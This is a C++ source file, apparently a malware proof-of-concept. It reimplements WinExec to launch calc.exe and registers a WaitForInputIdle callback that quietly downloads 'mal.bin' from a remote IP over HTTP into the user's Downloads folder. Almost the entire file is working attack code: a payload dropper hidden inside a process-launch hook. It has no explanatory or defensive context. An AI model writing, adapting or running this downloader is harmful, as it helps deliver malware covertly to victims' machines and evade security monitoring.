//Author : Navneet & ElementalX

#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <winternl.h>
#include <TlHelp32.h>


#pragma comment(lib, "wininet.lib")


DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)
{

    HINTERNET hInternet = InternetOpen(L"MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        std::cout << "Failed to initialize WinINet session\n";
        return 1;
    }


    HINTERNET hConnect = InternetConnect(hInternet, L"192.xxx.xx.x", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        std::cout << "Failed to connect to remote host\n";
        InternetCloseHandle(hInternet);
        return 1;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/mal.bin", NULL, NULL, NULL, 0, 0);
    if (!hRequest)
    {
        std::cout << "Failed to open HTTP request\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    BOOL bSendRequest = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
    if (!bSendRequest)
    {
        std::cout << "Failed to send HTTP request\n";
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    std::ofstream outfile("C:\\Users\\Downloads\\mal.bin", std::ios::out | std::ios::binary);
    if (!outfile.is_open())
    {
        std::cout << "Failed to create output file\n";
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    char buffer[1024];
    DWORD dwRead = 0;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &dwRead) && dwRead != 0)
    {
        outfile.write(buffer, dwRead);
    }


    outfile.close();


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}


typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);


WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;


VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)
{
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;
}


UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
{
    STARTUPINFOA StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));
    StartupInfo.cb = sizeof(STARTUPINFOA);
    StartupInfo.wShowWindow = (WORD)uCmdShow;
    StartupInfo.dwFlags = 0;

    if (!CreateProcessA(NULL,
        (LPSTR)lpCmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &StartupInfo,
        &ProcessInformation))
    {
        dosErr = GetLastError();
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;
    }

    if (NULL != UserWaitForInputIdleRoutine)
    {

        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);
    }

    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);

    return 33;
}

int main()
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);


    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);

    std::cout << "WinExec returned: " << result << std::endl;

    return 0;
}